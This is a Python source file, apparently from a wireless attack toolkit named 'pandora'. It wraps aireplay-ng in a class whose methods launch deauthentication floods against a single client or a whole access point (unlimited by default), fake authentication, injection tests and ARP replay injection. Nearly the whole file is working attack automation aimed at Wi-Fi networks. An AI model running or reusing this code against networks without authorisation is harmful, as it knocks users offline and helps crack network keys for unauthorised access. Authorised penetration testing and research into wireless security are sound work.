# import subprocess as sp
from pandora.config import TIMEOUT_WPA
from pandora.utils.program import ProgramBase
# from pandora.utils.utils import bytes_to_string

class Aireplay(ProgramBase):
    program = 'aireplay-ng'

    def deauth(self, network_bssid, station_mac, interface, amount_deauth_packets=0, timeout=TIMEOUT_WPA):
        deauth_command = [self.program, "--deauth", str(amount_deauth_packets), "-a", network_bssid, "-c", station_mac, interface]
        outer = self.pcaller.executeret(deauth_command)
        return outer
       # return pid

    def fake_auth(self, network_bssid, interface):
        #aireplay_red = sp.Popen(["aireplay-ng","-1","0","-a",redes[indice_red_atacar][0].strip(),"wlan0"],stdout=DEVNULL,stderr=DEVNULL,stdin = DEVNULL)
        command = [self.program, "-1", "0", "-a", network_bssid, interface]
        #pid = sp.Popen(command, stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)
        pid = self.pcaller.runread(command)
        return pid[0]

    def test_ap(self, network_bssid, interface):
        cmd = [self.program, "--test", "-a", network_bssid, interface]
        outerr = self.pcaller.runread(cmd)
        return outerr[0]

    def deauth_ap(self, network_bssid, interface, packets=0):
        deauth_command = [self.program, "--deauth", str(packets), "-a", network_bssid, interface]

        pid = self.pcaller.executeret(deauth_command)

        return pid

    def arp_inject(self, network_bssid, interface):
        arp_cmd = [self.program, '-3', '-b', network_bssid, interface]

        pid = self.pcaller.executeret(arp_cmd)

        return pid